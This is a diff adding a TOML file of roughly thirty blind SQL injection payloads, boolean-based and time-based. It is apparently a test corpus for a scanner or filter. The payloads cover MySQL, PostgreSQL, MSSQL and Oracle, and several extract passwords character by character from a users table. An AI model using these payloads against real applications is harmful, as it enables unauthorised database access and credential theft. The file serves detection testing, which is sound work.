@@ -1,0 +1,154 @@
+schema = 1
+# Blind SQLi: boolean-based and time-based.
+
+# Boolean-based blind
+[[case]]
+id = "bool_substring_eq"
+class = "sql"
+payload = "' AND SUBSTRING(version(),1,1)='5"
+
+[[case]]
+id = "bool_substring_lt"
+class = "sql"
+payload = "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)<'m"
+
+[[case]]
+id = "bool_ascii"
+class = "sql"
+payload = "' AND ASCII(SUBSTRING((SELECT user()),1,1))=114--"
+
+[[case]]
+id = "bool_left"
+class = "sql"
+payload = "' AND LEFT(version(),1)='5"
+
+[[case]]
+id = "bool_right"
+class = "sql"
+payload = "' AND RIGHT(version(),1)='0"
+
+[[case]]
+id = "bool_mid"
+class = "sql"
+payload = "' AND MID(version(),1,1)='5"
+
+[[case]]
+id = "bool_length"
+class = "sql"
+payload = "' AND LENGTH(database())=8--"
+
+[[case]]
+id = "bool_count_users"
+class = "sql"
+payload = "' AND (SELECT COUNT(*) FROM users)>0--"
+
+[[case]]
+id = "bool_exists_table"
+class = "sql"
+payload = "' AND EXISTS(SELECT 1 FROM users)--"
+
+[[case]]
+id = "bool_subquery_eq"
+class = "sql"
+payload = "' AND (SELECT 'a' FROM users LIMIT 1)='a"
+
+[[case]]
+id = "bool_case_when"
+class = "sql"
+payload = "' AND CASE WHEN (1=1) THEN 1 ELSE 0 END=1--"
+
+[[case]]
+id = "bool_if_mysql"
+class = "sql"
+payload = "' AND IF(SUBSTRING(version(),1,1)='5',1,0)=1--"
+
+[[case]]
+id = "bool_is_null_subquery"
+class = "sql"
+payload = "' AND (SELECT password FROM users LIMIT 1) IS NOT NULL--"
+
+[[case]]
+id = "bool_regex"
+class = "sql"
+payload = "' AND user() REGEXP '^r"
+
+[[case]]
+id = "bool_like"
+class = "sql"
+payload = "' AND user() LIKE 'r%"
+
+# Time-based blind
+[[case]]
+id = "time_sleep_5"
+class = "sql"
+payload = "' AND SLEEP(5)--"
+
+[[case]]
+id = "time_sleep_5_or"
+class = "sql"
+payload = "' OR SLEEP(5)--"
+
+[[case]]
+id = "time_pg_sleep"
+class = "sql"
+payload = "'; SELECT pg_sleep(5)--"
+
+[[case]]
+id = "time_waitfor_delay"
+class = "sql"
+payload = "'; WAITFOR DELAY '0:0:5'--"
+
+[[case]]
+id = "time_benchmark"
+class = "sql"
+payload = "' AND BENCHMARK(5000000,MD5(1))--"
+
+[[case]]
+id = "time_dbms_pipe"
+class = "sql"
+payload = "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--"
+
+[[case]]
+id = "time_heavy_query"
+class = "sql"
+payload = "' AND (SELECT COUNT(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C)--"
+
+[[case]]
+id = "time_sleep_in_if"
+class = "sql"
+payload = "' AND IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0)--"
+
+[[case]]
+id = "time_pg_sleep_case"
+class = "sql"
+payload = "' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END--"
+
+[[case]]
+id = "time_mssql_waitfor"
+class = "sql"
+payload = "'; IF (1=1) WAITFOR DELAY '0:0:5'--"
+
+[[case]]
+id = "time_sleep_paren"
+class = "sql"
+payload = "') AND SLEEP(5)--"
+
+[[case]]
+id = "time_sleep_double_quote"
+class = "sql"
+payload = "\" AND SLEEP(5)--"
+
+[[case]]
+id = "time_oracle_dbms_lock"
+class = "sql"
+payload = "' AND DBMS_LOCK.SLEEP(5)--"
+
+[[case]]
+id = "time_mysql_get_lock"
+class = "sql"
+payload = "' AND GET_LOCK('a',5)--"
+
+[[case]]
+id = "time_pg_sleep_with_subquery"
+class = "sql"
+payload = "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--"
